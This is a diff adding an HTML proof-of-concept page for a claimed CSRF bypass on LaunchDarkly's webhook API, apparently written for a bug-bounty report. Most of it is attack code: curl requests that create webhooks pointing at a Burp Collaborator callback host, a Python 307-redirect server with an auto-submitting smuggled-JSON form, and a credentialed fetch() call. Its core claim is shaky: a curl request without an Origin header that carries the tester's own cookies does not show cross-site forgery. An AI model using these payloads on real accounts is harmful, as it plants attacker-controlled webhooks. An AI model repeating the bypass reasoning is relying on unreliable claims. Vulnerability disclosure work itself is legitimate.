@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>LaunchDarkly CSRF PoC</title>
+  <style>
+    body { font-family: monospace; max-width: 800px; margin: 40px auto; padding: 20px; }
+    .success { color: green; font-weight: bold; }
+    .fail { color: red; font-weight: bold; }
+    .info { color: #666; }
+    code { background: #f4f4f4; padding: 2px 6px; border-radius: 3px; }
+    pre { background: #f4f4f4; padding: 15px; border-radius: 5px; overflow-x: auto; }
+    .box { border: 2px solid #ddd; padding: 15px; margin: 15px 0; border-radius: 8px; }
+    .box.red { border-color: #e74c3c; background: #fdf0ef; }
+    .box.green { border-color: #27ae60; background: #f0faf4; }
+  </style>
+</head>
+<body>
+  <h1>LaunchDarkly CSRF Bypass PoC</h1>
+  <p class="info">Bugcrowd submission — Session-based CSRF via missing Origin header validation</p>
+
+  <div class="box red">
+    <h2>Browser fetch() test (will fail — this is expected)</h2>
+    <p>Modern browsers send <code>Origin: https://attacker.com</code> which LD blocks → <strong>403</strong>.</p>
+    <p>The bypass requires <strong>Origin header to be absent</strong>, which happens via <strong>307 redirect chain</strong>.</p>
+    <button onclick="testFetch()">Test Browser Fetch</button>
+    <pre id="fetchResult">Click the button to test…</pre>
+  </div>
+
+  <div class="box green">
+    <h2>✅ Server-side proof (Burp Collaborator)</h2>
+    <p>The following webhooks were created via CSRF (no Origin header) pointing to:</p>
+    <code>https://8ajce4g0bu9257ldz4duitjjva11prdg.oastify.com/ld-csrf-callback</code>
+    <p>Check Burp Collaborator for HTTP callbacks at:</p>
+    <code>8ajce4g0bu9257ldz4duitjjva11prdg.oastify.com</code>
+  </div>
+
+  <h2>cURL proof (run locally)</h2>
+  <pre>
+# WITHOUT Origin — CSRF BYPASS (HTTP 201 — webhook created)
+curl -X POST "https://app.launchdarkly.com/api/v2/webhooks" \
+  -H "Cookie: ldso=YOUR_TOKEN; ajs_user_id=YOUR_ID; ajs_group_id=YOUR_ORG" \
+  -H "Content-Type: application/json" \
+  -d '{"url":"https://8ajce4g0bu9257ldz4duitjjva11prdg.oastify.com/csrf-poc","name":"csrf-bypass","on":false}'
+
+# WITH Origin: evil.com — BLOCKED (HTTP 403)
+curl -X POST "https://app.launchdarkly.com/api/v2/webhooks" \
+  -H "Cookie: ldso=YOUR_TOKEN; ..." \
+  -H "Content-Type: application/json" \
+  -H "Origin: https://evil.com" \
+  -d '{"url":"https://8ajce4g0bu9257ldz4duitjjva11prdg.oastify.com/csrf-poc","name":"csrf-bypass","on":false}'
+  </pre>
+
+  <h2>307 Redirect Server (for browser-based exploit)</h2>
+  <p>Run this on your HTTPS VPS to strip Origin on redirect:</p>
+  <pre>
+# redirect307.py
+from http.server import HTTPServer, BaseHTTPRequestHandler
+class H(BaseHTTPRequestHandler):
+    def do_POST(self):
+        self.send_response(307)
+        self.send_header('Location', 'https://app.launchdarkly.com/api/v2/webhooks')
+        self.end_headers()
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-Type', 'text/html')
+        self.end_headers()
+        self.wfile.write(b'''
+&lt;form id="f" action="/" method="POST" enctype="text/plain"&gt;
+  &lt;input name='{"url":"https://8ajce4g0bu9257ldz4duitjjva11prdg.oastify.com/pwned","name":"csrf-pwn","on":false,"ignored":"' value='"}'&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('f').submit();&lt;/script&gt;
+''')
+HTTPServer(('0.0.0.0', 443), H).serve_forever()
+  </pre>
+
+  <script>
+    function testFetch() {
+      const el = document.getElementById('fetchResult');
+      el.textContent = 'Testing… (this will fail — that is the expected browser behavior)\n\n';
+      fetch('https://app.launchdarkly.com/api/v2/webhooks', {
+        method: 'POST',
+        credentials: 'include',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          url: 'https://8ajce4g0bu9257ldz4duitjjva11prdg.oastify.com/poc-test',
+          name: 'browser-csrf-test',
+          on: false
+        })
+      })
+      .then(r => {
+        el.textContent += `Status: ${r.status}\n`;
+        el.textContent += `This should be 403 — browser Origin is blocked.\n`;
+        el.textContent += `\n✅ Expected behavior: Origin was present → LD blocked it.\n`;
+        el.textContent += `❌ If you see 201, something is wrong.\n`;
+      })
+      .catch(e => {
+        el.textContent += `Error: ${e.message}\n`;
+        el.textContent += `\n⚠ Network error is expected due to CORS with credentials.\n`;
+        el.textContent += `\n✅ This confirms browser cannot exploit this directly.\n`;
+        el.textContent += `\n🔑 The bypass is server-side: cURL without Origin → 201.\n`;
+      });
+    }
+  </script>
+</body>
+</html>
